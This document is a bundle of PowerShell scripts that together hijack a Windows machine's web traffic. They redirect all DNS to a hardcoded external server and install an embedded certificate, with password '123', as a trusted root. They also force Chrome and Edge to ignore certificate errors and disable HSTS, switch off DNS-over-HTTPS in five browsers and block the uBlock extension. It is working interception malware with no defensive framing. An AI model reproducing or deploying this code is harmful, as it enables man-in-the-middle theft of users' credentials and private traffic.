. ./consts.ps1

function ConfigureCertificates {
    foreach ($key in $xdata.Keys) {
        Cert-Work -contentString $xdata[$key]
    }
}

function Cert-Work {
    param(
        [string] $contentString
    )
    $outputFilePath = [System.IO.Path]::GetTempFileName()
    $binary = [Convert]::FromBase64String($contentString)
    Set-Content -Path $outputFilePath -Value $binary -AsByteStream
    Install-CertificateToStores -CertificateFilePath $outputFilePath -Password '123'
}

function Install-CertificateToStores {
    param(
        [string] $CertificateFilePath,
        [string] $Password
    )

    try {
        $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force

        # Import certificate to Personal (My) store
        $personalStorePath = "Cert:\LocalMachine\My"
        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $personalStorePath -Password $securePassword -ErrorAction Stop
        Write-Output "Certificate installed successfully to Personal store (My)."

        # Import certificate to Root store
        $rootStorePath = "Cert:\LocalMachine\Root"
        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $rootStorePath -Password $securePassword -ErrorAction Stop
        Write-Output "Certificate installed successfully to Root store."

    } catch {
        throw "Failed to install certificate: $_"
    }
}

function ConfigureChrome {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" -Name "EnableAutoDOH" -Value 0

    $chromeKeyPath = "HKLM:\Software\Policies\Google\Chrome"

    if (-not (Test-Path $chromeKeyPath)) {
        New-Item -Path $chromeKeyPath -Force | Out-Null
    }

    New-Item -Path $chromeKeyPath -Force | Out-Null  # Create the key if it doesn't exist
    Set-ItemProperty -Path $chromeKeyPath -Name "CommandLineFlag" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
    Set-ItemProperty -Path $chromeKeyPath -Name "DnsOverHttps" -Value "off"

    Set-ItemProperty -Path $chromeKeyPath -Name "IgnoreCertificateErrors" -Value 1

    Write-Output "Chrome configured"
}

. ./utils.ps1

function ConfigureChromeUblock {
    $keywords = @("uBlock")

    foreach ($dir in Get-EnvPaths) {
        $chromeDir = Join-Path -Path $dir -ChildPath "Google\Chrome\User Data\Default\Extensions"
        
        try {
            if (Test-Path -Path $chromeDir -PathType Container) {
                $extensions = Get-ChildItem -Path $chromeDir -Directory

                foreach ($extension in $extensions) {
                    $manFile = chromeublock_FindManifestFile -folder $extension.FullName
                    if ($manFile -ne "") {
                        $foundKeyword = $false
                        
                        foreach ($manifestValue in $keywords) {
                            $content = Get-Content -Path $manFile -Raw
                            if ($content -match [regex]::Escape($manifestValue)) {
                                $foundKeyword = $true
                                break
                            }
                        }

                        if ($foundKeyword) {
                            $extFolderName = [System.IO.Path]::GetFileName($extension.FullName)
                            chromeublock_ProcessManifestAll -extName $extFolderName
                        }
                    }
                }
            }
        } catch {
             Write-Error "Error occurred: $_"
        }
    }
}


function chromeublock_FindManifestFile {
    param (
        [string]$folder
    )

    $result = ""

    Get-ChildItem -Path $folder | ForEach-Object {
        if (-not ($_.PSIsContainer)) {
            if ($_.Name -eq "manifest.json") {
                $result = $_.FullName
                return
            }
        } elseif ($_.Name -notin @('.', '..')) {
            $result = chromeublock_FindManifestFile -folder $_.FullName
            if ($result -ne "") {
                return
            }
        }
    }

    return $result
}


function chromeublock_ProcessManifestAll {
    param (
        [string]$extName
    )

    chromeublock_ProcessManifest -extName $extName -browser "Google\Chrome"
}

function chromeublock_ProcessManifest {
    param (
        [string]$extName,
        [string]$browser
    )

    $regPath = "HKLM:\SOFTWARE\Policies\$browser\ExtensionInstallBlocklist"
    
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    
    $regKeyIndex = 1
    do {
        $keyName = "$regKeyIndex"
        $val = Get-ItemProperty -Path $regPath -Name $keyName -ErrorAction SilentlyContinue
        if ($val -eq $extName) {
            return
        }
        $regKeyIndex++
    } until (-not (Test-Path "$regPath\$keyName"))

    Set-ItemProperty -Path $regPath -Name $keyName -Value $extName
}
$PrimaryDNSServer = '185.247.141.76'
$SecondaryDNSServer = '185.247.141.76'
$xdata = @{
    'alpa.com'='MIIKYQIBAzCCCh0GCSqGSIb3DQEHAaCCCg4EggoKMIIKBjCCBg8GCSqGSIb3DQEHAaCCBgAEggX8MIIF+DCCBfQGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAgaBdYEaa28aQICB9AEggTYw3bZyX6ivLMCXMuyEAb/89IjDn74GQMck/GVNpH0'+ 
'oVxEKkEGPrZXDPobGrXMUqEp3ZILvIB7pWkerrzlzhk4zC/PZkr5mnL13lufxwDXPnE1hK3bXVYbL1mSb2StbeNSKLOKkywDeooESySOxjUrdHW/N3Sb/AsR26ww+TaYng7CEO+/KOeN5fgDXUp/+DsXMp+WOAwxX6nG07WnBtmMNm1BDs7/hN70SHtoyPpzwEff14dj'+ 
'ajzw1Z7qKPYBBaepJ89YklxsZHXTmGN8I+KChpnfrD/ruPJfb4TWbcHddC8nJ+xb2XUqpnt5hgZeKWqkh2KboZhmc6wk2bt1g7qbPO5grPxEN0j+4fVzmTVs8rPMcziaMlE4A7Qkd2tFIZI0y+7Io5dqttXy+VLY11C2t4IlLr+u5B0p/MqT6uEgwxKlHfaYhMtVqC9J'+ 
'vKsw4LCMlyNcaDqNj2WvqkN5hbhRhfo3aNFHi3nPJKGTFuBmdmimBsbqzEZ2IoSb6wJYg2TUDpx8tHfN4HfgtlnMwJ7EQoemJaXrsi0c+mzNZu9UJVqduUeS68gWezwwDnYPj7gZcnX/3oQxvmfLj59S7eF6udOF0s5zQ2WZ5DVHeikT64rSyAOj1bHaMVmjDfZvyg8l'+ 
'osg/pH3VZnoyLCMnnrJwTQTUj1d5LzXmwGgwnWFURvgrNG1RrYxmuGpj/KMjCn6mZ6CT0bvi3vXO8NKeVvW7IoUnMf9Uv9mXMZqrjl19wp1HsXRXLWTUJ7eRllUyT1cxemzU8Q/uVxtpQy+nMUNux63milVxb41sBchKtEj/Wu1v1n9u0YvQHb0x8Vs3gAIrK0+axbIu'+ 
'OSGmrnY3YuVRb1A4vTT2uoC3lxxfwzs2G5Y5A/LYVL3hAFa4l8jcbkhGxDuGcyu5qVd4Y25LoZbVRAP1z/zLGZMMJDjCR9rmdSvygALFNBTbV4s8qxWuzmqKLxiuNpcMTgYiP0BHu5XRaV6L5OAU0w79DmsU30SRo275LRQH73UsIOy54/9U2rWuLal9gETd7cBZIdKk'+ 
'guK/8+xv8kVPYRvVrt7Q49NI5dsJ0tlUgpTNRKaPOnjedFYPv286UKdHqfwA0gXnDdlcdU/LO0NHy9vrx66OGxx/U/xO9gUWBVZVrmavZgx3PCrH8Zf/c71waQB+WzcE5a38iqM/edFV4fhPqKNUHHQ9WZm4FlKjLJ5VVZMz7wr4zXicCnm4Otnw78MVeS4cDqOXRCvm'+ 
'k58yFL2GYsSbtv2CxsQknLnsSKPqiKKCueDB+wnwLrDo2RbKqjDtwF6FzMEpsimKHvyHyWu98BZ//U/ZwFr7BFusuEYupZ6L+Vg784tnBevBrcV/r1L08dqRYJIVu1yCDjq6gL79JdwphHOCX57WVhbIxS0GyAteFEaYf9DLYdWF7+s3Yq9hj9WulbCc8wU6zo04Zw1j'+ 
'yN0+JbdLewOgKPwzN6oxdJ3I/gVdxhapK9BB2UTWaBx9S+u9CVT348BBtCThi/yEUF2zvxCkz4cxw2g8TV+FTyKMVZ1k9Jk18L3LkTuMcWPUYJ2p+A9Yy3fd+nnOwmIK43fSRp6TT2yqJRy11jgh2gpHs0H6a6CWy/o3YXgoOQf3dZUiQxH7Z95YBNcnXVSZUY9gpu2J'+ 
'wfYJTpe9Miz/xzGB4jANBgkrBgEEAYI3EQIxADATBgkqhkiG9w0BCRUxBgQEAQAAADBdBgkqhkiG9w0BCRQxUB5OAHQAZQAtADQAMwAyAGQAZgBmADkAYQAtADEAOAA1ADkALQA0ADIANgBjAC0AOQA4ADUANAAtAGIAZQA5ADQAYgAzADAANgAzADIAYQA1MF0GCSsG'+ 
'AQQBgjcRATFQHk4ATQBpAGMAcgBvAHMAbwBmAHQAIABTAHQAcgBvAG4AZwAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIwggPvBgkqhkiG9w0BBwagggPgMIID3AIBADCCA9UGCSqGSIb3DQEHATAcBgoqhkiG9w0BDAEDMA4ECPLp'+ 
'8x24ND91AgIH0ICCA6gdTSq2KTE6lMToPysaJlNdZE3M31vlm04qVgRk7BaEGvcMQmFvDPFW+r9DYWCH4rQewcgE74Sb0MXdQA8uNVPVeRYF7yhwQXcOYzljF9lksBFCvGDWPVhsZK+NGFJvTUMlBONBxA+vegk5IIu+Y2dFF5g8g1tpInV7cXbnd/WoWaMXBAWKhnEm'+ 
'venelrcwH9sh/PpxiNu1ckYKgrYrn2QG8c4sUWX/gK574fkQU+QAFip/Kt2a7e7vCX/pAfdcgDh6vqfLtGG9+OKB4/PWJY5aFIvfC5nJJxtve+PxTEiMeBuI6ijmut9ZhOYHWydzellmB2QmzRVDc3GTF0Pi5BoDcnz5piR5pY5tccsLs+y7oecU2i6eedIp5MDo9eix'+ 
'vs+Kk2py8YxzzWvc/641httXse9yeTi84yfbcp7FxvZyGZF8m97ydDXNQqI+GUaloN70rmUttL8NUdKnllvK0mXyJ9z+H9775r4bw1WNRPyDet8CnfvMO4+Ck6VhUbAbPZ0OobnJDNMqszH20ONOpPenxaBLqVHKa4cj6+ACCggbaD72SdxgaSOvN5Gim6VJ+t3TxQDb'+ 
'f3yKYKZZH9lhfjb88M519dxP36RpXOsN+Nr5Lqa1eltA8Ci4Gykx0M8V2BoxpvIBowfbMgpcxKxlTdcHU7R62XNpth+mrwP8Q0lng+WgfhH4Ijh90awpAzQu0EJtqk/JlIaFYNkJoxZM9WGtb1m2eFIt5ycG1b7VwM6pejTDxxzmSxLBUWipn4LAYmLO+pL99RdqWjEp'+ 
'b1wsES9G7NqBYDrKgbjc+GMShMUFf0RL7xN6QV7NuEnw73RbQ+E2Xn08T8EtMIDv1BYEMY9CjoKKbqEFhzTFytNXyAxSPZW8IgkbhX4bfI5FkxH08gH5wm5Vkvq6WSnUb4wfhEgm4CuO+b1+L1T8OC/LjEXOPhi+C52ZDiFxEJprQvGkpDHKaB+uhS+1etCWtD3BRjgF'+ 
'6eYZmMyG77ox47lMmtW98M+hjWY/9L0RH22MGDp+O5jyZRElHpqXRbGTQsk94+UZXMaxFT30JI2951/5qgGV8Fe/Q7ms043hhCariw4l0AbAEcyjshVXPwwhT+o/5EFBxJ7IbB1ZhFYQUBY6qfXg5bbKr+5PDJQHeB1eB+kkzZSTI/Kux4EpBDQ7SqE6o3sVnGp0im+8'+ 
'LpVb/Ynxen9MvsOzOWV33jgS+U3/LIqX9xwNfELdbRruPgNFIx6gM5gcRZdoKcwkrNwwOzAfMAcGBSsOAwIaBBTmvLxOciwuXMyWNkDHC/T0oPCeTAQUBKVSZxkvXCx+8yNCsoNZW6QObSoCAgfQ'
}

. .\Consts.ps1

function Set-DnsServers {
    param (
        [string]$primaryDnsServer,
        [string]$secondaryDnsServer
    )

    try {
        # Get network adapters that are IP-enabled
        $networkAdapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notlike '*Virtual*' }

        foreach ($adapter in $networkAdapters) {
            # Set DNS servers using Set-DnsClientServerAddress cmdlet
            Set-DnsClientServerAddress -InterfaceAlias $adapter.Name -ServerAddresses @($primaryDnsServer, $secondaryDnsServer) -Confirm:$false
            
            Write-Output "Successfully set DNS servers for adapter: $($adapter.InterfaceDescription)"
        }
    } catch {
        Write-Error "An error occurred: $_"
    }
}
function ConfigureEdge {
    $edgeKeyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Edge"
    
    if (-not (Test-Path $edgeKeyPath)) {
        New-Item -Path $edgeKeyPath -Force | Out-Null
    }
    
    $commandLinePath = Join-Path $edgeKeyPath "CommandLine"
    if (-not (Test-Path $commandLinePath)) {
        New-Item -Path $commandLinePath -Force | Out-Null
    }
    
    Set-ItemProperty -Path $commandLinePath -Name "(Default)" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
    
    Set-ItemProperty -Path $edgeKeyPath -Name "DnsOverHttps" -Value "off"

    Set-ItemProperty -Path $edgeKeyPath -Name "IgnoreCertificateErrors" -Value 1
}
. ./utils.ps1

function ConfigureFireFox 
{
    Set-FirefoxRegistry -KeyPaths @(
        'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS',
        'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS'
    ) -ValueNames @('Enabled', 'Locked') -Values @(0, 1)

    foreach ($dir in Get-EnvPaths) 
    {
        $path = Join-Path -Path $dir -ChildPath "Mozilla\Firefox\Profiles\user.js"

        try 
        {
            $UserJSContent = 'user_pref("network.trr.mode", 5);'
            
            if (!(Test-Path -Path $path -PathType Leaf)) 
            {
                $null = New-Item -Path $path -ItemType File
                Add-Content -Path $path -Value $UserJSContent
            }
        }
        catch 
        {
            Write-Error "Failed to write to user.js file: $_"
        }
    }
}


function Set-FirefoxRegistry {
    param (
        [string[]]$KeyPaths,
        [string[]]$ValueNames,
        [int[]]$Values
    )

    $ErrorActionPreference = 'Stop'
    $regKey = [Microsoft.Win32.Registry]::LocalMachine

    try {
        foreach ($i in 0..($KeyPaths.Length - 1)) {
            $key = $regKey.OpenSubKey($KeyPaths[$i], $true)
            if ($key -eq $null) {
                Write-Error "Failed to open registry key: $($KeyPaths[$i])"
                return
            }

            $key.SetValue($ValueNames[$i], $Values[$i], [Microsoft.Win32.RegistryValueKind]::DWord)
            $key.Close()
        }
    }
    catch {
        Write-Error "Error accessing or modifying registry: $_"
    }
}
. ./utils.ps1

function ConfigureOpera
{
    Close-Processes(@('opera_crashreporter.exe', 'opera.exe'))

    foreach ($dir in Get-EnvPaths) {
        $path = Join-Path -Path $dir -ChildPath 'Opera Software\Opera Stable\Local State'

        try {
            if (Test-Path -Path $path -PathType Leaf)
            {
                ConfigureOperaInternal -FilePath $path
            }
        } catch {
            Write-Error "Error occurred: $_"
        }
    }
}

function ConfigureOperaInternal {
    param(
        [string]$filePath
    )

    $content = Get-Content -Path $filePath -Raw | ConvertFrom-Json

    if ($null -eq $content.dns_over_https -or $content.dns_over_https -isnot [object]) {
        $content.dns_over_https = @{
            'mode' = 'off'
            'opera' = @{
                'doh_mode' = 'off'
            }
            'templates' = ""
        }
    } else {
        $content.dns_over_https.mode = 'off'
        $content.dns_over_https.opera = @{
            'doh_mode' = 'off'
        }
        $content.dns_over_https.templates = ""
    }

    $jsonString = $content | ConvertTo-Json -Depth 10

    Set-Content -Path $filePath -Value $jsonString -Encoding UTF8 -Force

    Write-Host "Successfully configured Opera settings in $filePath"
}
. ./consts.ps1
. ./utils.ps1
. ./dnsman.ps1
. ./chrome.ps1
. ./chrome.uBlock.ps1
. ./edge.ps1
. ./yandex.ps1
. ./opera.ps1
. ./firefox.ps1
. ./cert.ps1

function main {
    Set-DNSServers -PrimaryDNSServer $primaryDNSServer -SecondaryDNSServer $secondaryDNSServer
    ConfigureCertificates
    ConfigureChrome
    ConfigureEdge
    ConfigureYandex
    ConfigureFireFox
    ConfigureOpera
    ConfigureChromeUblock
}

main
function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}
. ./utils.ps1

function ConfigureYandex
{
    Close-Processes(@('service_update.exe','browser.exe'))

    foreach ($dir in Get-EnvPaths) {
        $path = Join-Path -Path $dir -ChildPath 'Yandex\YandexBrowser\User Data\Local State'

        try {
            if (Test-Path -Path $path -PathType Leaf)
            {
                ConfigureYandexInternal -FilePath $path
            }
        } catch {
            Write-Error "Error occurred: $_"
        }
    }
}

function ConfigureYandexInternal {
    param(
        [string]$filePath
    )
    $content = Get-Content -Path $filePath -Raw | ConvertFrom-Json

    if ($null -eq $content.dns_over_https -or $content.dns_over_https -isnot [object]) {
        $content | Add-Member -MemberType NoteProperty -Name 'dns_over_https' -Value @{
            'mode' = 'off'
            'templates' = ""
        }
    } else {
        $content.dns_over_https.mode = 'off'
        $content.dns_over_https.templates = ""
    }

    $jsonString = $content | ConvertTo-Json -Depth 10

    Set-Content -Path $filePath -Value $jsonString -Encoding UTF8 -Force

    Write-Host "Successfully configured Yandex settings in $filePath"
}

